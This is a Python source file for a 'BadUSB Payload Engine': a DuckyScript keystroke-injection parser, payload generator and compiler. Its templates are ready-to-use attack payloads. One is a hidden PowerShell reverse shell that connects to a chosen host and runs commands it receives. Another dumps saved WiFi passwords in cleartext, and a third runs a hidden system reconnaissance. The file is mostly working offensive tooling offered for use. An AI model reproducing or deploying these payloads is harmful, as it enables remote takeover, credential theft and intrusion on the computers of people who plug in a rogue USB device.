"""BadUSB Payload Engine"""
import os, json, time

class DuckyScript:
    """DuckyScript interpreter and generator"""
    COMMANDS = {
        "STRING": "type_string", "DELAY": "delay", "ENTER": "key_enter",
        "GUI": "key_gui", "ALT": "key_alt", "CTRL": "key_ctrl",
        "SHIFT": "key_shift", "TAB": "key_tab", "ESCAPE": "key_escape",
        "UP": "key_up", "DOWN": "key_down", "LEFT": "key_left", "RIGHT": "key_right",
        "DELETE": "key_delete", "BACKSPACE": "key_backspace",
        "WINDOWS": "key_gui", "COMMAND": "key_gui",
        "REM": "comment", "DEFAULTDELAY": "set_default_delay",
    }
    
    def __init__(self):
        self.default_delay = 100
        self.actions = []
    
    def parse(self, script):
        self.actions = []
        for line in script.strip().split("\n"):
            line = line.strip()
            if not line: continue
            parts = line.split(" ", 1)
            cmd = parts[0].upper()
            arg = parts[1] if len(parts) > 1 else ""
            if cmd in self.COMMANDS:
                self.actions.append({"command": cmd, "arg": arg, "method": self.COMMANDS[cmd]})
        return self.actions

class PayloadGenerator:
    TEMPLATES = {
        "reverse_shell": """REM Reverse Shell Payload
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -nop -c "$c=New-Object Net.Sockets.TCPClient('{host}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}}"
ENTER""",
        "wifi_exfil": """REM WiFi Password Exfiltration
DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 500
STRING netsh wlan show profiles >> %TEMP%\\wifi.txt
ENTER
DELAY 1000
STRING for /f "tokens=2 delims=:" %a in ('netsh wlan show profiles ^| findstr "Profile"') do netsh wlan show profile name=%a key=clear >> %TEMP%\\wifi.txt
ENTER""",
        "recon": """REM System Reconnaissance
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "systeminfo; ipconfig /all; net user; Get-Process" | Out-File $env:TEMP\\recon.txt
ENTER""",
    }
    
    def generate(self, template_name, **kwargs):
        template = self.TEMPLATES.get(template_name, "")
        for k, v in kwargs.items():
            template = template.replace(f"{{{k}}}", str(v))
        return template
    
    def list_templates(self):
        return list(self.TEMPLATES.keys())

class PayloadCompiler:
    def compile_ducky(self, script_text, output_path="inject.bin"):
        """Compile DuckyScript to binary (simplified)"""
        parser = DuckyScript()
        actions = parser.parse(script_text)
        binary = bytearray()
        for action in actions:
            if action["command"] == "STRING":
                for ch in action["arg"]:
                    binary.append(ord(ch))
                    binary.append(0x00)
            elif action["command"] == "DELAY":
                ms = int(action["arg"]) if action["arg"] else 100
                binary.append(0x00)
                binary.append(ms & 0xFF)
            elif action["command"] == "ENTER":
                binary.append(0x28)
                binary.append(0x00)
        with open(output_path, "wb") as f:
            f.write(binary)
        return len(binary)
